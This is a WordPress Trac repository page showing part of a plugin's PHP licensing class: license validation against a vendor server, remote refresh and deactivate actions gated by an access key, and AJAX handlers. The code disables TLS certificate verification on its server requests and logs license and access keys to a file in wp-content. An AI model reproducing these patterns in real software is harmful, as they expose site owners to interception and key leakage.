| [144](#L144) | wp\_send\_json\_error('Invalid access key.'); |
| [145](#L145) | } |
| [146](#L146) |  |
| [147](#L147) | $post\_data = @json\_decode(file\_get\_contents('php://input'), true); |
| [148](#L148) | do\_action('wf\_licensing\_' . trim($this->prefix, '\_') . '\_remote\_action\_' . $action, $action\_params, $this, $post\_data); |
| [149](#L149) |  |
| [150](#L150) | wp\_send\_json\_error('Remote action did not execute.'); |
| [151](#L151) | die(); |
| [152](#L152) | } |
| [153](#L153) | } // monitor\_remote\_actions |
| [154](#L154) |  |
| [155](#L155) |  |
| [156](#L156) | function remote\_action\_refresh($action\_params) |
| [157](#L157) | { |
| [158](#L158) | $data = $this->prepare\_server\_query\_data('remote\_refresh'); |
| [159](#L159) |  |
| [160](#L160) | wp\_send\_json\_success($data); |
| [161](#L161) | } // remote\_action\_refresh |
| [162](#L162) |  |
| [163](#L163) |  |
| [164](#L164) | function remote\_action\_validate\_license($action\_params) |
| [165](#L165) | { |
| [166](#L166) | $validate = $this->validate(); |
| [167](#L167) | $license = $this->get\_license(); |
| [168](#L168) |  |
| [169](#L169) | wp\_send\_json\_success(array('validate' => $validate, 'license' => $license)); |
| [170](#L170) | } // remote\_action\_validate\_license |
| [171](#L171) |  |
| [172](#L172) |  |
| [173](#L173) | function remote\_action\_deactivate\_license($action\_params) |
| [174](#L174) | { |
| [175](#L175) | $license = $this->get\_license(); |
| [176](#L176) | $this->update\_license(false); |
| [177](#L177) |  |
| [178](#L178) | if ($action\_params['keep\_license\_key']) { |
| [179](#L179) | $tmp = array('error' => 'License is no longer valid for this site.', 'license\_key' => $license['license\_key']); |
| [180](#L180) | $this->update\_license($tmp); |
| [181](#L181) | } |
| [182](#L182) |  |
| [183](#L183) | wp\_send\_json\_success(); |
| [184](#L184) | } // remote\_action\_deactivate\_license |
| [185](#L185) |  |
| [186](#L186) |  |
| [187](#L187) | private function is\_remote\_action($action) |
| [188](#L188) | { |
| [189](#L189) | $actions = array('refresh', 'validate\_license', 'deactivate\_license'); |
| [190](#L190) | $actions = apply\_filters('wf\_licensing\_' . trim($this->prefix, '\_') . '\_remote\_actions', $actions); |
| [191](#L191) |  |
| [192](#L192) | if (in\_array($action, $actions)) { |
| [193](#L193) | return true; |
| [194](#L194) | } else { |
| [195](#L195) | return false; |
| [196](#L196) | } |
| [197](#L197) | } // is\_remote\_action |
| [198](#L198) |  |
| [199](#L199) |  |
| [200](#L200) | /\*\* |
| [201](#L201) | \* Log message if debugging is enabled. |
| [202](#L202) | \* Log file: /wp-content/wf-licensing.log |
| [203](#L203) | \* |
| [204](#L204) | \* @param string $message Message to write to log. |
| [205](#L205) | \* @param mixed $data Optional, extra data to write to debug log. |
| [206](#L206) | \* |
| [207](#L207) | \* @return void |
| [208](#L208) | \*/ |
| [209](#L209) | function log($message, ...$data) |
| [210](#L210) | { |
| [211](#L211) | if (!$this->debug) { |
| [212](#L212) | return; |
| [213](#L213) | } |
| [214](#L214) |  |
| [215](#L215) | $log\_file = trailingslashit(WP\_CONTENT\_DIR) . 'wf-licensing.log'; |
| [216](#L216) | $fp = fopen($log\_file, 'a+'); |
| [217](#L217) |  |
| [218](#L218) | fputs($fp, '[' . date('r') . '] ' . $this->prefix . ': '); |
| [219](#L219) | fputs($fp, (string) $message . PHP\_EOL); |
| [220](#L220) | foreach ($data as $tmp) { |
| [221](#L221) | fputs($fp, print\_r($tmp, true)); |
| [222](#L222) | } |
| [223](#L223) |  |
| [224](#L224) | fputs($fp, PHP\_EOL); |
| [225](#L225) | fclose($fp); |
| [226](#L226) | } // log |
| [227](#L227) |  |
| [228](#L228) |  |
| [229](#L229) | /\*\* |
| [230](#L230) | \* Fetches license details from the database. |
| [231](#L231) | \* |
| [232](#L232) | \* @param string $key If set returns only requested options key. |
| [233](#L233) | \* |
| [234](#L234) | \* @return string |
| [235](#L235) | \*/ |
| [236](#L236) | function get\_license($key = '') |
| [237](#L237) | { |
| [238](#L238) | $default = array( |
| [239](#L239) | 'license\_key' => '', |
| [240](#L240) | 'error' => '', |
| [241](#L241) | 'valid\_until' => '', |
| [242](#L242) | 'last\_check' => 0, |
| [243](#L243) | 'name' => '', |
| [244](#L244) | 'access\_key' => '', |
| [245](#L245) | 'meta' => array() |
| [246](#L246) | ); |
| [247](#L247) |  |
| [248](#L248) | $options = get\_option('wf\_licensing\_' . $this->prefix, array()); |
| [249](#L249) | $options = array\_merge($default, $options); |
| [250](#L250) |  |
| [251](#L251) | if (empty($options['access\_key'])) { |
| [252](#L252) | $options['access\_key'] = $this->generate\_access\_key(); |
| [253](#L253) | $this->update\_license($options); |
| [254](#L254) | } |
| [255](#L255) |  |
| [256](#L256) | if (!empty($key)) { |
| [257](#L257) | return $options[$key]; |
| [258](#L258) | } else { |
| [259](#L259) | return $options; |
| [260](#L260) | } |
| [261](#L261) | } // get\_license |
| [262](#L262) |  |
| [263](#L263) |  |
| [264](#L264) | function generate\_access\_key() |
| [265](#L265) | { |
| [266](#L266) | $keyspace = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; |
| [267](#L267) | $pieces = array(); |
| [268](#L268) | $max = strlen($keyspace) - 1; |
| [269](#L269) |  |
| [270](#L270) | for ($i = 0; $i < 32; ++$i) { |
| [271](#L271) | $pieces[] = $keyspace[random\_int(0, $max)]; |
| [272](#L272) | } |
| [273](#L273) | return implode('', $pieces); |
| [274](#L274) | } // generate\_access\_key |
| [275](#L275) |  |
| [276](#L276) |  |
| [277](#L277) | function get\_license\_formatted($key = '') |
| [278](#L278) | { |
| [279](#L279) | $license = $this->get\_license(); |
| [280](#L280) | $out = array( |
| [281](#L281) | 'name' => '', |
| [282](#L282) | 'name\_long' => '', |
| [283](#L283) | 'valid\_until' => '', |
| [284](#L284) | 'expires' => '', |
| [285](#L285) | 'license\_key' => '', |
| [286](#L286) | 'license\_key\_hidden' => '', |
| [287](#L287) | 'recurring' => false, |
| [288](#L288) | 'keyless' => false, |
| [289](#L289) | ); |
| [290](#L290) |  |
| [291](#L291) | if (!$this->is\_active()) { |
| [292](#L292) | return $out; |
| [293](#L293) | } |
| [294](#L294) | $license['valid\_until'] = $license['valid\_until']; |
| [295](#L295) |  |
| [296](#L296) | $out['name'] = $license['name']; |
| [297](#L297) | $out['name\_long'] = $license['name']; |
| [298](#L298) | if ($license['meta']) { |
| [299](#L299) | $tmp = ''; |
| [300](#L300) | foreach ($license['meta'] as $meta => $meta\_value) { |
| [301](#L301) |  |
| [302](#L302) | if ($meta[0] == '\_' || filter\_var($meta\_value, FILTER\_VALIDATE\_BOOLEAN) != true) { |
| [303](#L303) | continue; |
| [304](#L304) | } |
| [305](#L305) | $meta = str\_replace('\_', ' ', $meta); |
| [306](#L306) | $meta = ucwords($meta); |
| [307](#L307) | $tmp .= $meta . ', '; |
| [308](#L308) | } |
| [309](#L309) | $tmp = trim($tmp, ', '); |
| [310](#L310) | if ($tmp) { |
| [311](#L311) | $out['name\_long'] .= ' with ' . $tmp; |
| [312](#L312) | } |
| [313](#L313) | } |
| [314](#L314) |  |
| [315](#L315) | if ($license['valid\_until'] == $this->valid\_forever) { |
| [316](#L316) | $out['valid\_until'] = 'forever'; |
| [317](#L317) | $out['recurring'] = false; |
| [318](#L318) | } else { |
| [319](#L319) | $out['valid\_until'] = 'until ' . date(get\_option('date\_format'), strtotime($license['valid\_until'])); |
| [320](#L320) | $out['recurring'] = true; |
| [321](#L321) | } |
| [322](#L322) |  |
| [323](#L323) | if (date('Y-m-d') == $license['valid\_until']) { |
| [324](#L324) | $out['expires'] = 'today'; |
| [325](#L325) | } elseif (date('Y-m-d', time() + 30 \* DAY\_IN\_SECONDS) > $license['valid\_until']) { |
| [326](#L326) | $tmp = (strtotime($license['valid\_until'] . date(' G:i:s')) - time()) / DAY\_IN\_SECONDS; |
| [327](#L327) | $out['expires'] = 'in ' . round($tmp) . ' days'; |
| [328](#L328) | } else { |
| [329](#L329) | $out['expires'] = 'in more than 30 days'; |
| [330](#L330) | } |
| [331](#L331) |  |
| [332](#L332) | if (empty($license['license\_key']) || $license['license\_key'] == 'keyless') { |
| [333](#L333) | $out['keyless'] = true; |
| [334](#L334) | } else { |
| [335](#L335) | $out['keyless'] = false; |
| [336](#L336) | $out['license\_key'] = $license['license\_key']; |
| [337](#L337) | $tmp = strlen($license['license\_key']); |
| [338](#L338) | $dash = false; |
| [339](#L339) | $new = ''; |
| [340](#L340) | for ($i = $tmp - 1; $i >= 0; $i--) { |
| [341](#L341) | if ($dash == false || $out['license\_key'][$i] == '-') { |
| [342](#L342) | $new = $out['license\_key'][$i] . $new; |
| [343](#L343) | } else { |
| [344](#L344) | $new = '\*' . $new; |
| [345](#L345) | } |
| [346](#L346) | if ($out['license\_key'][$i] == '-') { |
| [347](#L347) | $dash = true; |
| [348](#L348) | } |
| [349](#L349) | } |
| [350](#L350) | $out['license\_key\_hidden'] = $new; |
| [351](#L351) | } |
| [352](#L352) |  |
| [353](#L353) | $out = apply\_filters('wf\_licensing\_license\_formatted\_' . $this->prefix, $out); |
| [354](#L354) |  |
| [355](#L355) | if (!empty($key)) { |
| [356](#L356) | return $out[$key]; |
| [357](#L357) | } else { |
| [358](#L358) | return $out; |
| [359](#L359) | } |
| [360](#L360) | } // get\_license\_formatted |
| [361](#L361) |  |
| [362](#L362) |  |
| [363](#L363) | /\*\* |
| [364](#L364) | \* Updates license details in the database. |
| [365](#L365) | \* |
| [366](#L366) | \* @param string $data License data to save; or empty to delete license |
| [367](#L367) | \* |
| [368](#L368) | \* @return bool |
| [369](#L369) | \*/ |
| [370](#L370) | function update\_license($data = false) |
| [371](#L371) | { |
| [372](#L372) | if (false === $data) { |
| [373](#L373) | $tmp = delete\_option('wf\_licensing\_' . $this->prefix); |
| [374](#L374) | } else { |
| [375](#L375) | if (!isset($data['access\_key'])) { |
| [376](#L376) | $data['access\_key'] = $this->get\_license('access\_key'); |
| [377](#L377) | } |
| [378](#L378) | $tmp = update\_option('wf\_licensing\_' . $this->prefix, $data); |
| [379](#L379) | } |
| [380](#L380) |  |
| [381](#L381) | return $tmp; |
| [382](#L382) | } // update\_license |
| [383](#L383) |  |
| [384](#L384) |  |
| [385](#L385) | /\*\* |
| [386](#L386) | \* Check if license is valid |
| [387](#L387) | \* |
| [388](#L388) | \* @param string $feature If set it checks for a specific feature. |
| [389](#L389) | \* @param bool $force\_check Forces license recheck on server instead of just cached values. |
| [390](#L390) | \* |
| [391](#L391) | \* @return boolean |
| [392](#L392) | \*/ |
| [393](#L393) | function is\_active($feature = '', $force\_check = false, $local\_only = false) |
| [394](#L394) | { |
| [395](#L395) | $last\_check = $this->get\_license('last\_check'); |
| [396](#L396) | if ($local\_only == false) { |
| [397](#L397) | if ($force\_check || ($last\_check && ($last\_check + HOUR\_IN\_SECONDS \* 8) < time())) { |
| [398](#L398) | $this->log('auto recheck license'); |
| [399](#L399) | $this->validate(); |
| [400](#L400) | } |
| [401](#L401) | } |
| [402](#L402) |  |
| [403](#L403) | $license = $this->get\_license(); |
| [404](#L404) |  |
| [405](#L405) | if ( |
| [406](#L406) | !empty($license['license\_key']) && !empty($license['name']) && |
| [407](#L407) | !empty($license['valid\_until']) && $license['valid\_until'] >= date('Y-m-d') |
| [408](#L408) | ) { |
| [409](#L409) | if (!empty($feature)) { |
| [410](#L410) | if (!empty($license['meta'][$feature]) && filter\_var($license['meta'][$feature], FILTER\_VALIDATE\_BOOLEAN) == true) { |
| [411](#L411) | return true; |
| [412](#L412) | } else { |
| [413](#L413) | return false; |
| [414](#L414) | } |
| [415](#L415) | } else { |
| [416](#L416) | return true; |
| [417](#L417) | } |
| [418](#L418) | } else { |
| [419](#L419) | return false; |
| [420](#L420) | } |
| [421](#L421) | } // is\_active |
| [422](#L422) |  |
| [423](#L423) |  |
| [424](#L424) | /\*\* |
| [425](#L425) | \* Hook to plugin activation action. |
| [426](#L426) | \* If there's a license key, try to activate & write response. |
| [427](#L427) | \* |
| [428](#L428) | \* @return void |
| [429](#L429) | \*/ |
| [430](#L430) | function activate\_plugin() |
| [431](#L431) | { |
| [432](#L432) | $license = $this->get\_license(); |
| [433](#L433) | if ($this->is\_active() || !$license['license\_key']) { |
| [434](#L434) | return false; |
| [435](#L435) | } |
| [436](#L436) |  |
| [437](#L437) | $tmp = $this->validate(); |
| [438](#L438) | if ($tmp) { |
| [439](#L439) | $this->log('activating plugin, license activated'); |
| [440](#L440) | return true; |
| [441](#L441) | } else { |
| [442](#L442) | $this->log('activating plugin, unable to activate license'); |
| [443](#L443) | return false; |
| [444](#L444) | } |
| [445](#L445) | } // activate\_plugin |
| [446](#L446) |  |
| [447](#L447) |  |
| [448](#L448) | /\*\* |
| [449](#L449) | \* Hook to plugin deactivation action. |
| [450](#L450) | \* If there's a license key, try to deactivate & write response. |
| [451](#L451) | \* |
| [452](#L452) | \* @return void |
| [453](#L453) | \*/ |
| [454](#L454) | function deactivate\_plugin() |
| [455](#L455) | { |
| [456](#L456) | if (!$this->is\_active()) { |
| [457](#L457) | return false; |
| [458](#L458) | } |
| [459](#L459) |  |
| [460](#L460) | $license = $this->get\_license(); |
| [461](#L461) | $result = $this->query\_licensing\_server('deactivate\_license'); |
| [462](#L462) |  |
| [463](#L463) | if (is\_wp\_error($result) || !is\_array($result) || !isset($result['success']) || $result['success'] == false) { |
| [464](#L464) | $this->log('unable to deactivate license'); |
| [465](#L465) |  |
| [466](#L466) | return false; |
| [467](#L467) | } else { |
| [468](#L468) | $license['error'] = ''; |
| [469](#L469) | $license['name'] = ''; |
| [470](#L470) | $license['valid\_until'] = ''; |
| [471](#L471) | $license['meta'] = ''; |
| [472](#L472) | $license['last\_check'] = 0; |
| [473](#L473) | $this->update\_license($license); |
| [474](#L474) | $this->log('license deactivated'); |
| [475](#L475) |  |
| [476](#L476) | return true; |
| [477](#L477) | } |
| [478](#L478) | } // deactivate\_plugin |
| [479](#L479) |  |
| [480](#L480) |  |
| [481](#L481) | /\*\* |
| [482](#L482) | \* Use when uninstalling (deleting) the plugin to clean up. |
| [483](#L483) | \* |
| [484](#L484) | \* @param string $prefix Same prefix as used when initialising the class. |
| [485](#L485) | \* @return bool |
| [486](#L486) | \*/ |
| [487](#L487) | static function uninstall\_plugin($prefix) |
| [488](#L488) | { |
| [489](#L489) | $tmp = delete\_option('wf\_licensing\_' . $prefix); |
| [490](#L490) |  |
| [491](#L491) | return $tmp; |
| [492](#L492) | } // uninstall\_plugin |
| [493](#L493) |  |
| [494](#L494) |  |
| [495](#L495) | /\*\* |
| [496](#L496) | \* Delete license locally and send deactivate ping to licensing server |
| [497](#L497) | \* |
| [498](#L498) | \* @return void |
| [499](#L499) | \*/ |
| [500](#L500) | function deactivate() { |
| [501](#L501) | $license = $this->get\_license(); |
| [502](#L502) | $result = $this->query\_licensing\_server('deactivate\_license', array()); |
| [503](#L503) | $this->update\_license(false); |
| [504](#L504) |  |
| [505](#L505) | return $result; |
| [506](#L506) | } // deactivate |
| [507](#L507) |  |
| [508](#L508) | /\*\* |
| [509](#L509) | \* Validate license key on server and save response. |
| [510](#L510) | \* |
| [511](#L511) | \* @param string $license\_key License key, or leave empty to pull from saved. |
| [512](#L512) | \* |
| [513](#L513) | \* @return void |
| [514](#L514) | \*/ |
| [515](#L515) | function validate($license\_key = '') |
| [516](#L516) | { |
| [517](#L517) | $license = $this->get\_license(); |
| [518](#L518) | if (empty($license\_key)) { |
| [519](#L519) | $license\_key = $license['license\_key']; |
| [520](#L520) | } |
| [521](#L521) |  |
| [522](#L522) | $out = array( |
| [523](#L523) | 'license\_key' => $license\_key, |
| [524](#L524) | 'error' => '', |
| [525](#L525) | 'name' => '', |
| [526](#L526) | 'last\_check' => 0, |
| [527](#L527) | 'valid\_until' => '', |
| [528](#L528) | 'meta' => array() |
| [529](#L529) | ); |
| [530](#L530) |  |
| [531](#L531) | $result = $this->query\_licensing\_server('validate\_license', array('license\_key' => $license\_key)); |
| [532](#L532) |  |
| [533](#L533) | if (is\_wp\_error($result)) { |
| [534](#L534) | $out['error'] = 'Error querying licensing server. ' .  $result->get\_error\_message() . ' Please try again in a few moments.'; |
| [535](#L535) | $this->update\_license($out); |
| [536](#L536) |  |
| [537](#L537) | return false; |
| [538](#L538) | } elseif (!is\_array($result) || !isset($result['success'])) { |
| [539](#L539) | $out['error'] = 'Invalid response from licensing server. Please try again in a few moments.'; |
| [540](#L540) | $this->update\_license($out); |
| [541](#L541) |  |
| [542](#L542) | return false; |
| [543](#L543) | } elseif ($result['success'] == false) { |
| [544](#L544) | $out['error'] = $result['data']; |
| [545](#L545) | $this->update\_license($out); |
| [546](#L546) |  |
| [547](#L547) | return true; |
| [548](#L548) | } else { |
| [549](#L549) | $out['error'] = $result['data']['error']; |
| [550](#L550) | $out['name'] = $result['data']['name']; |
| [551](#L551) | $out['valid\_until'] = $result['data']['valid\_until']; |
| [552](#L552) | $out['meta'] = $result['data']['meta']; |
| [553](#L553) | $out['last\_check'] = time(); |
| [554](#L554) | $this->update\_license($out); |
| [555](#L555) |  |
| [556](#L556) | return true; |
| [557](#L557) | } |
| [558](#L558) | } // validate |
| [559](#L559) |  |
| [560](#L560) |  |
| [561](#L561) | function validate\_ajax() |
| [562](#L562) | { |
| [563](#L563) | check\_ajax\_referer('wf\_licensing\_' . $this->prefix); |
| [564](#L564) |  |
| [565](#L565) | $license\_key = trim($\_REQUEST['license\_key']); |
| [566](#L566) | if (empty($license\_key)) { |
| [567](#L567) | $this->update\_license(false); |
| [568](#L568) | do\_action('wf\_licensing\_' . $this->prefix . 'validate\_ajax', $license\_key, false); |
| [569](#L569) |  |
| [570](#L570) | wp\_send\_json\_success(); |
| [571](#L571) | } else { |
| [572](#L572) | $result = $this->validate($license\_key); |
| [573](#L573) | $license = $this->get\_license(); |
| [574](#L574) | do\_action('wf\_licensing\_' . $this->prefix . 'validate\_ajax', $license\_key, $result); |
| [575](#L575) |  |
| [576](#L576) | if ($result == true) { |
| [577](#L577) | wp\_send\_json\_success($result); |
| [578](#L578) | } else { |
| [579](#L579) | wp\_send\_json\_error($license); |
| [580](#L580) | } |
| [581](#L581) | } |
| [582](#L582) | } // validate\_ajax |
| [583](#L583) |  |
| [584](#L584) |  |
| [585](#L585) | function deactivate\_ajax() |
| [586](#L586) | { |
| [587](#L587) | check\_ajax\_referer('wf\_licensing\_' . $this->prefix); |
| [588](#L588) |  |
| [589](#L589) | $old\_license = $this->get\_license(); |
| [590](#L590) | $result = $this->deactivate(); |
| [591](#L591) | do\_action('wf\_licensing\_' . $this->prefix . 'deactivate\_ajax', $old\_license, $result); |
| [592](#L592) | wp\_send\_json\_success($result); |
| [593](#L593) | } // deactivate\_ajax |
| [594](#L594) |  |
| [595](#L595) |  |
| [596](#L596) | function save\_ajax() |
| [597](#L597) | { |
| [598](#L598) | check\_ajax\_referer('wf\_licensing\_' . $this->prefix); |
| [599](#L599) |  |
| [600](#L600) | $out['license\_key'] = trim(sanitize\_text\_field($\_POST['license\_key'])); |
| [601](#L601) |  |
| [602](#L602) | if (sanitize\_text\_field($\_POST['success']) == 'true') { |
| [603](#L603) | $out['error'] = trim(sanitize\_text\_field($\_POST['data']['error'])); |
| [604](#L604) | $out['name'] = trim(sanitize\_text\_field($\_POST['data']['name'])); |
| [605](#L605) | $out['valid\_until'] = trim(sanitize\_text\_field($\_POST['data']['valid\_until'])); |
| [606](#L606) | $out['meta'] = sanitize\_text\_field($\_POST['data']['meta']); |
| [607](#L607) | } else { |
| [608](#L608) | $out['error'] = trim(sanitize\_text\_field($\_POST['data'])); |
| [609](#L609) | $out['name'] = ''; |
| [610](#L610) | $out['valid\_until'] = ''; |
| [611](#L611) | $out['meta'] = array(); |
| [612](#L612) | } |
| [613](#L613) | $out['last\_check'] = time(); |
| [614](#L614) |  |
| [615](#L615) | $this->update\_license($out); |
| [616](#L616) | do\_action('wf\_licensing\_' . $this->prefix . 'save\_ajax', $out); |
| [617](#L617) |  |
| [618](#L618) | wp\_send\_json\_success(); |
| [619](#L619) | } // save\_ajax |
| [620](#L620) |  |
| [621](#L621) |  |
| [622](#L622) | function prepare\_server\_query\_data($action) |
| [623](#L623) | { |
| [624](#L624) | $license = $this->get\_license(); |
| [625](#L625) |  |
| [626](#L626) | $query\_data = array( |
| [627](#L627) | 'action' => $action, |
| [628](#L628) | 'license\_key' => $license['license\_key'], |
| [629](#L629) | 'rand' => rand(1000, 9999), |
| [630](#L630) | 'version' => $this->version, |
| [631](#L631) | 'wp\_version' => get\_bloginfo('version'), |
| [632](#L632) | 'site\_url' => get\_home\_url(), |
| [633](#L633) | 'site\_title' => get\_bloginfo('name'), |
| [634](#L634) | 'access\_key' => $license['access\_key'], |
| [635](#L635) | 'meta' => apply\_filters('wf\_licensing\_' . trim($this->prefix, '\_') . '\_query\_server\_meta', array(), $action) |
| [636](#L636) | ); |
| [637](#L637) |  |
| [638](#L638) | if (substr($action, 0, 7) == 'remote\_') { |
| [639](#L639) | unset($query\_data['action'], $query\_data['license\_key']); |
| [640](#L640) | } |
| [641](#L641) |  |
| [642](#L642) | return $query\_data; |
| [643](#L643) | } // prepare\_server\_query\_data |
| [644](#L644) |  |
| [645](#L645) |  |
| [646](#L646) | /\*\* |
| [647](#L647) | \* Run license server query. |
| [648](#L648) | \* |
| [649](#L649) | \* @param string $action |
| [650](#L650) | \* @param array $data |
| [651](#L651) | \* |
| [652](#L652) | \* @return string response|bool |
| [653](#L653) | \*/ |
| [654](#L654) | function query\_licensing\_server($action, $data = array()) |
| [655](#L655) | { |
| [656](#L656) | $license = $this->get\_license(); |
| [657](#L657) |  |
| [658](#L658) | $request\_params = array('sslverify' => false, 'timeout' => 25, 'redirection' => 2); |
| [659](#L659) | $default\_data = $this->prepare\_server\_query\_data($action); |
| [660](#L660) |  |
| [661](#L661) | $request\_data = array\_merge($default\_data, $data, array('action' => $action)); |
| [662](#L662) | $request\_data = apply\_filters('wf\_licensing\_' . trim($this->prefix, '\_') . '\_query\_server\_data', $request\_data, $action); |
| [663](#L663) | array\_walk\_recursive($request\_data, function (&$val, $ind) { |
| [664](#L664) | $val = rawurlencode($val); |
| [665](#L665) | }); |
| [666](#L666) |  |
| [667](#L667) | $this->log('query licensing server', $request\_data); |
| [668](#L668) |  |
| [669](#L669) | $url = rtrim(add\_query\_arg($request\_data, trailingslashit($this->licensing\_servers[0] . $this->api\_ver)), '&'); |
| [670](#L670) |  |
| [671](#L671) | $response = wp\_remote\_get($url, $request\_params); |
| [672](#L672) |  |
| [673](#L673) | $body = wp\_remote\_retrieve\_body($response); |
| [674](#L674) | $result = @json\_decode($body, true); |
| [675](#L675) |  |
| [676](#L676) | $this->log('licensing server response', $response); |
| [677](#L677) |  |
| [678](#L678) | if (is\_wp\_error($response) || empty($body) || !is\_array($result) || !isset($result['success'])) { |
| [679](#L679) | if (is\_wp\_error($response)) { |
| [680](#L680) | return $response; |
| [681](#L681) | } else { |
| [682](#L682) | return new WP\_Error(1, 'Invalid server response format.'); |
| [683](#L683) | } |
| [684](#L684) | } else { |
| [685](#L685) | return $result; |
| [686](#L686) | } |
| [687](#L687) | } // query\_licensing\_server |
| [688](#L688) | } // WF\_Licensing\_CSMM |
| [689](#L689) | } // if WF\_Licensing\_CSMM |

**Note:** See [TracBrowser](/wiki/TracBrowser)
for help on using the repository browser.

[Trac UI Preferences](/prefs)
### Download in other formats:

* [Plain Text](/browser/minimal-coming-soon-maintenance-mode/tags/2.38/framework/wf-licensing.php?format=txt)
* [Original Format](/export/3220669/minimal-coming-soon-maintenance-mode/tags/2.38/framework/wf-licensing.php)

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Donate](https://wordpressfoundation.org/donate/)
* [Swag](https://mercantile.wordpress.org/)

* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [Get Involved](https://make.wordpress.org/)
* [Learn](https://learn.wordpress.org/)

* [Showcase](https://wordpress.org/showcase/)
* [Plugins](https://wordpress.org/plugins/)
* [Themes](https://wordpress.org/themes/)
* [Patterns](https://wordpress.org/patterns/)

* [WordCamp](https://central.wordcamp.org/)
* [WordPress.TV](https://wordpress.tv/)
* [BuddyPress](https://buddypress.org/)
* [bbPress](https://bbpress.org/)

* [WordPress.com](https://wordpress.com/?ref=wporg-footer)
* [Matt](https://ma.tt/)
* [Privacy](https://wordpress.org/about/privacy/)
* [Public Code](https://publiccode.eu/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our Twitter account](https://twitter.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)


